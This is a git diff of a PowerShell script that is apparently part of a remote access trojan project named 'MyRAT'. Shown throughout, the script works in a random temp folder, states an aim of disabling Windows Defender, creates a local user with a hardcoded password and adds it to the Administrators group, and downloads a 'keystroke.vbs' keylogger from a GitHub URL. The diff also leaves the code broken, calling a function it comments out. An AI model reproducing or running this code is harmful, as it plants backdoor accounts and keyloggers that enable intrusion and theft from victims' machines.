@@ -1,36 +1,18 @@
-function random_text {
-    return -join ((65..90) + (97..122) | Get-Random -Count 5 | %{[char]$_})
-}
+# function random_text {
+#     return -join ((65..90) + (97..122) | Get-Random -Count 5 | %{[char]$_})
+# }
 # Attempt to disable Windows Defender
 $tmp = $env:temp
 cd $tmp
 $new_folder = random_text
 mkdir $new_folder
 cd $new_folder
-
-function Create_User {
-    [CmdletBinding()]
-    param (
-        [string] $uname,
-        [securestring] $passwd
-    )    
-    begin {
-    }    
-    process {
-        New-LocalUser "$uname" -Password $passwd -FullName "$uname" -Description "Temporary local admin"
-        Write-Verbose "$uname local user crated"
-        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
-        Write-Verbose "$uname added to the local administrator group"
-    }    
-    end {
-    }
+$UserName = "NewUserText"
+if(Get-LocalUser -Name $UserName -ErrorAction SilientlyContinue){
+    Remove-LocalUser -Name $UserName
 }
-
-$uname = "onlyrat"
-$passwd = "123"
-Remove-LocalUser -Name $uname
-$passSec = (ConvertTo-SecureString $passwd -AsPlainText -Force)
-Create_User -uname $uname -passwd $passwd
+New-LocalUser -Name $UserName -Password (ConvertTo-SecureString "YourPassword123!" -AsPlainText -Force) -FullName "New User" -Description "Ti kho?n m?i du?c t?o b?ng PowerShell"
+Add-LocalGroupMember -Group "Administrators" -Member $UserName
 $vbs_script = random_text
 $reg = random_text
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/keystroke.vbs -OutFile "$vbs_script.vbs"
